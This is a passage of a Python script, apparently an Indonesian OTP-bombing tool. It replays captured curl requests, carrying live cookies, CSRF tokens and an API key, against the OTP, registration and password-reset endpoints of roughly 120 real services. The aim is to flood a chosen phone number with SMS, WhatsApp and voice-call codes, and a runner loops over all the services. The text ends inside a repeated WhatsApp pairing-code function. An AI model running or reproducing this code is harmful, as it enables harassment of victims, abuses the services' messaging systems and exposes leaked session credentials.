  -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def loading_spinner():
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while not stop_spinner:
        sys.stdout.write(f"\r{U}❯❯❯ {W}Mengirim OTP {R} │ {W}{chars[i % len(chars)]}{N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 40 + "\r")
    sys.stdout.flush()

def spam_otp_babyhappy(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
  -H 'host: club.babyhappydiapers.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.babyhappydiapers.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.babyhappydiapers.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone":"{phone}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_els(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json
        import random
        import string

        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))

        curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
  -H 'host: member.els.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://member.els.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://member.els.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
  -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_dreamdubai(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://www.dreamdubai.com/send-sms-web' \\
  -H 'host: www.dreamdubai.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.dreamdubai.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.dreamdubai.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: cquid=||; __cq_dnt=0; dw_dnt=0; dwac_7bec52bd774fafa7db63dd4057=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY%3D|dw-only|||AED|false|Asia%2FDubai|true; cqcid=abvjR9yv05ESdLZnHR91lRWUF1; sid=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY; dwanonymous_4331083bd03400c189943d61e1cec6f3=abvjR9yv05ESdLZnHR91lRWUF1; dwsid=twdRkKTkmCImlUsRMH9LBkPsS5DtqAl3MjcZ87C95egkhfzbVC7cgsGVHXVBcgEW7HRjl0WmItTbDoKBKWbsAQ==; _gcl_au=1.1.1946167819.1787471764; _ga=GA1.1.1950809663.1787471765; _scid=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _scid_r=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _tt_enable_cookie=1; _ttp=01M0PSX8SNJVMS4Z4RMC04KFE5_.tt.1; _fbp=fb.1.1787471766583.518002055353343985; __cq_uuid=abvjR9yv05ESdLZnHR91lRWUF1; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; adjust_web_uuid=01084d62-d6eb-46f0-1e7a-2ea4a6d74006; moe_uuid=f12354a2-ff50-4ca4-a11c-894991f0c79e; _ga_5SBWDJD7BR=GS2.1.s1787471764$o1$g1$t1787471783$j41$l0$h0; ttcsid=1787471766394::iLRSmXWkEDcPZtKcpYlf.1.1787471796796.0::1.-6089.0::30175.5.347.429::0.0.0; ttcsid_CMSC9GJC77U67KV9FM3G=1787471766387::4t-aqwqsjjEKeGJ_Bmt5.1.1787471796797.1' \\
  -H 'priority: u=1, i' \\
  --data-raw 'phoneNumber={phone}&countryCode=%2B62&isApp=false&mode=whatsapp-otp'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_bukuaku(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://bukuaku.id/base/forgot_password' \\
  -H 'host: bukuaku.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://bukuaku.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://bukuaku.id/id/login/forgot-password' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: auth.strategy=local; cf_clearance=XqnbImZU1JDSaShhb_lmYSpQqKmmCO9LXzhupeLjb4Q-1787472072-1.2.1.1-QHXLCp4nn93kWxK329lkkBmufK61MrozGvisAi5I63FFG9hOuxAma36dmo1zR_6WDUUGtMKeWjunD.ZVtfBH2naodVEMlOIAbS1gr7UfK5rIGFZOOeoReHAxz_6JUcOZibiR1Eyi64cokdS0l0d2qSoclc86B8J.BNNgGDAE_nGxci1_vsnCw5sfFeWtB5khVDMOks7FA7CEJ_pVcX9gyk53ovGK.8Z7uUlgYm9iS_zebMc4pprAjKdDrueY5Zy12Pky.BIJQJFYqtdechKNkk4bXrch1XONusumwCGokSdr7cmalMeSZXeLgMOq4Ddv8jl5G.ybxcHwECWUY3kr_303wQpLvS7TE9p0PT.Xej0; _gcl_au=1.1.984154179.1787472072; _ga=GA1.1.250152120.1787472073; _ga_9KQFL3Q499=GS2.1.s1787472072$o1$g1$t1787472585$j60$l0$h0; _ga_GN7DGX69XZ=GS2.1.s1787472073$o1$g1$t1787472586$j59$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"otp_type":"WA","phone":"{phone}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_starlite(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://starliteindonesia.com/api/customer-registration/phone-otp/request' \\
  -H 'host: starliteindonesia.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'x-api-key: 280999!FTTH' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://starliteindonesia.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://starliteindonesia.com/?register=active' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.688980367.1787486216; _gcl_au=1.1.1809383858.1787486217; _fbp=fb.1.1787486217519.84569997662616804; _tt_enable_cookie=1; _ttp=01M0Q7P9JFTT6QXYBSCJ02DM2B_.tt.1; _ga_1ST28GMNXL=GS2.1.s1787486216$o1$g1$t1787486240$j36$l0$h0; _ga_DFWC1L1VBM=GS2.1.s1787486218$o1$g1$t1787486240$j38$l0$h0; ttcsid=1787486217851::Tc3BK0KkD3xGc2Lw3-TR.1.1787486318913.0::1.12616.0::100794.12.441.383::0.0.0; ttcsid_D6N6GJRC77U5VG9U4DSG=1787486217846::JJVvUOjr14dqXefVXgI6.1.1787486318914.1' \\
  -d '{{"phone_number":"{phone}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_unpatti(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json
        import random
        import string

        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{name}{random.randint(100,999)}@gmail.com"
        nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=16))

        curl_cmd = f"""curl -s -X POST 'https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp' \\
  -H 'host: mandiri.pmb.unpatti.ac.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://mandiri.pmb.unpatti.ac.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://mandiri.pmb.unpatti.ac.id/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -d '{{"nama":"{name}","email":"{email}","no_telp":"{phone}","nik":"{nik}","tanggal_lahir":"2002-09-11","password":"{password}","password_confirmation":"{password}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_ykkipeduli(nomor):
    try:
        if phone.startswith("0"):
            phone = phone[1:]
            phone = "62" + phone
        elif phone.startswith("62"):
            phone = phone
        elif phone.startswith("+62"):
            phone = phone[3:]
            phone = "62" + phone
        else:
            phone = "62" + phone

        email = f"user{int(time.time())}{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}@gmail.com"

        curl_cmd = f"""curl -s -X POST 'https://ykkipeduli.org/register/sahabat/send-otp' \\
  -H 'host: ykkipeduli.org' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: 2mxUxQy8CxToMdYQwQzsIvNM4uhIsyGLwwcaUpB0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://ykkipeduli.org' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://ykkipeduli.org/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6IkJ1NGxNSERac0M2WWR5eElhbkU4WEE9PSIsInZhbHVlIjoiQzJwM0xveXcrU2Y0eXkrY2JkTFEyWm15YVhRbzNYWkF3WDQ5MmtLczBCc1Y4NHhjQi9mU3ZPQTVaVUJNdWFZZ2hrSHFKUFdwK0dDT25VS1ovcDNSL1NoeDVWV3NIY2NuekhjeGVpc1FDb2U1cjNZTHRYZ1V3bGJPWEFjQXRXS1IiLCJtYWMiOiI2YjAxNjRkNmZkN2M0YTc3NDUwNDgyOTRiZTQ0MzYzOTM4M2FmODAxOGViMGYxYjQzYzAyY2E2ZTRlZDg0NjJhIiwidGFnIjoiIn0%3D; ykki-session=eyJpdiI6Imx4dFpJZnNwbGN6S3FFMm9maEZta2c9PSIsInZhbHVlIjoiQXRsWC9xMm5KaTVqUTAzYlNTckNnYlIxc1dML2xVOFljSzlzK1ZQK3Z5RkJHZzRKL3VNQlNNN0JwZm02RGs1SHlTNVUrallueDRrc3o3aEZMVDNKaE9iR1lmT2NBdXdwQ3FCd0paT2psNEx4YkV3ZDRQcDEwMDlIYjZQQVNhTDkiLCJtYWMiOiI1M2VkYjBkY2M2ZTQzOTE2YzZlYWYxNDAzMmNmOGIzYjliMWQwNzcxZmM4YjI2NTc1ZTNhNzg3NWUxMGY3NjMxIiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  -d '{{"name":"testimoni","phone":"{phone}","email":"{email}","password":"5fnzSTRcW38wBNG","password_confirmation":"5fnzSTRcW38wBNG","account_type":"donatur"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def run_spam_otp(nomor):
    apis = [
        ("Sidemang", spam_otp_sidemang),
        ("Adiraku", spam_otp_adiraku),
        ("Tokopedia", spam_otp_tokopedia),
        ("Singa Kedua", spam_otp_singa_kedua),
        ("Singa", spam_otp_singa),
        ("Singa WA", spam_otp_singa_wa),
        ("Pinhome", spam_otp_pinhome),
        ("Duniagames", spam_otp_duniagames),
        ("Acc", spam_otp_acc),
        ("Acc Kedua", spam_otp_acc_kedua),
        ("Absenku", spam_otp_absenku),
        ("Saturdays", spam_otp_saturdays),
        ("Maulagi", spam_otp_maulagi),
        ("Bliblitiket", spam_otp_bliblitiket),
        ("Matahari", spam_otp_matahari),
        ("Rumah123", spam_otp_rumah123),
        ("Halodoc", spam_otp_halodoc),
        ("Misteraladin", spam_otp_misteraladin),
        ("Paper", spam_otp_paper),
        ("Planetban", spam_otp_planetban),
        ("Bunda", spam_otp_bunda),
        ("Bonusbelanja", spam_otp_bonusbelanja),
        ("Hijup", spam_otp_hijup),
        ("Alodokter SMS", spam_otp_alodokter_sms),
        ("Alodokter", spam_otp_alodokter),
        ("Optikmelawai", spam_otp_optikmelawai),
        ("Jembatani", spam_otp_jembatani),
        ("Datascripmall", spam_otp_datascripmall),
        ("Rcx", spam_otp_rcx),
        ("Sahabatteknisi", spam_otp_sahabatteknisi),
        ("Liva", spam_otp_liva),
        ("Daihatsu", spam_otp_daihatsu),
        ("Singa Toy", spam_otp_singa_toy),
        ("Kreditpintar", spam_otp_kreditpintar),
        ("Internetrakyat", spam_otp_internetrakyat),
        ("Pinjamduit", spam_otp_pinjamduit),
        ("Isellershop", spam_otp_isellershop),
        ("Greensm", spam_otp_greensm),
        ("Tiptip", spam_otp_tiptip),
        ("Dokterin", spam_otp_dokterin),
        ("Uangme", spam_otp_uangme),
        ("Seva", spam_otp_seva),
        ("Uatas", spam_otp_uatas),
        ("Topindowa", spam_otp_topindowa),
        ("Amaha", spam_otp_amaha),
        ("Kasirpintar", spam_otp_kasirpintar),
        ("Bigseller", spam_otp_bigseller),
        ("Toyota", spam_otp_toyota),
        ("Carro", spam_otp_carro),
        ("Idealz", spam_otp_idealz),
        ("Ktakilat", spam_otp_ktakilat),
        ("Bantusaku", spam_otp_bantusaku),
        ("Bisatopup", spam_otp_bisatopup),
        ("Speedcash", spam_otp_speedcash),
        ("Speedcash WA", spam_otp_speedcash_wa),
        ("Speedcash SMS", spam_otp_speedcash_sms),
        ("Sicepat", spam_otp_sicepat),
        ("Iskconmumbai", spam_otp_iskconmumbai),
        ("Jogjakita", spam_otp_jogjakita),
        ("Yogyaonline", spam_otp_yogyaonline),
        ("Mengantar", spam_otp_mengantar),
        ("Volta", spam_otp_volta),
        ("Pluang", spam_otp_pluang),
        ("Watsons", spam_otp_watsons),
        ("Watsons Kedua", spam_otp_watsons_kedua),
        ("Youtap", spam_otp_youtap),
        ("Beautyhaul", spam_otp_beautyhaul),
        ("Byu", spam_otp_byu),
        ("Astradaihatsu2", spam_otp_astradaihatsu2),
        ("Astradaihatsu SMS", spam_otp_astradaihatsu_sms),
        ("Myvalue", spam_otp_myvalue),
        ("Vedantu", spam_otp_vedantu),
        ("Viuum", spam_otp_viuum),
        ("Onebunda", spam_otp_onebunda),
        ("Ibudanbalita", spam_otp_ibudanbalita),
        ("Joob", spam_otp_joob),
        ("Rivafashion", spam_otp_rivafashion),
        ("Swiggy", spam_otp_swiggy),
        ("Cilory", spam_otp_cilory),
        ("Naturalfarm", spam_otp_naturalfarm),
        ("Gritero", spam_otp_gritero),
        ("Toss", spam_otp_toss),
        ("Topindosms", spam_otp_topindosms),
        ("Toss2", spam_otp_toss2),
        ("Eiger", spam_otp_eiger),
        ("Farmaklik", spam_otp_farmaklik),
        ("Nutriclub", spam_otp_nutriclub),
        ("Eci Signup", spam_otp_eci_signup),
        ("Eci", spam_otp_eci),
        ("Qoalaplus", spam_otp_qoalaplus),
        ("Singa Yoi", spam_otp_singa_yoi),
        ("Uangme", spam_otp_uangme),
        ("Telp Jogjakita", telp_spam_jogjakita),
        ("Fastwork", spam_otp_fastwork),
        ("SMS Optikmelawai", spam_otp_sms_optikmelawai),
        ("Mapclub WA", spam_otp_mapclub_wa),
        ("Mapclub WA Kedua", spam_otp_mapclub_wa_kedua),
        ("Mapclub SMS", spam_otp_mapclub_sms),
        ("Mapclub SMS Kedua", spam_otp_mapclub_sms_kedua),
        ("Ruparupa", spam_otp_ruparupa),
        ("Cashenable", spam_otp_cashenable),
        ("Eraspace", spam_eraspace),
        ("Jec", spam_otp_jec),
        ("Oyorooms", spam_otp_oyorooms),
        ("Kitabisa Wea", spam_otp_kitabisa_wea),
        ("Auto2000", spam_otp_auto2000),
        ("Buccheri", spam_otp_buccheri),
        ("Generasimaju", spam_otp_generasimaju),
        ("Norkaroots", spam_otp_norkaroots),
        ("Kpoin", spam_otp_kpoin),
        ("99co", spam_otp_99co),
        ("Bunda CMS", spam_otp_bunda_cms),
        ("Pkumayong", spam_otp_pkumayong),
        ("Babyhappy", spam_otp_babyhappy),
        ("Els", spam_otp_els),
        ("Dreamdubai", spam_otp_dreamdubai),
        ("Bukuaku", spam_otp_bukuaku),
        ("Starlite", spam_otp_starlite),
        ("Unpatti", spam_otp_unpatti),
        ("Ykkipeduli", spam_otp_ykkipeduli),
    ]

    results = []
    for name, func in apis:
        try:
            if func(nomor):
                results.append(f"✅ {name}: Berhasil")
            else:
                results.append(f"❌ {name}: Gagal")
        except:
            results.append(f"❌ {name}: Error")
        time.sleep(0.2)

    return results

# ===================== FUNGSI SPAM GMAIL =====================

def spam_call(nomor):
    try:
        url = "https://gateway.ukuindo.com/entrance/v3/getcode"
        random_imei = ''.join(random.choices('0123456789', k=15))
        headers = {
            "Device": "ANDROID",
            "Imei": random_imei,
            "Content-Type": "application/json",
        }
        payload = {"phone": nomor, "smsType": "VOICE_SMS", "channel": "GooglePlay"}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def run_spam_call(nomor):
    success = 0
    for i in range(10):
        if spam_call(nomor):
            success += 1
        time.sleep(2)
    return success

# ===================== FUNGSI SPAM PAIRING =====================

def spam_pairing(nomor):
    try:
        url = f"https://pair.subzero.gleeze.com/code?number={nomor}"
        resp = requests.get(url, timeout=10)
        return resp.status_code == 200
    except:
        return False

def run_spam_pairing(nomor):
    success = 0
    for i in range(5):
        if spam_pairing(nomor):
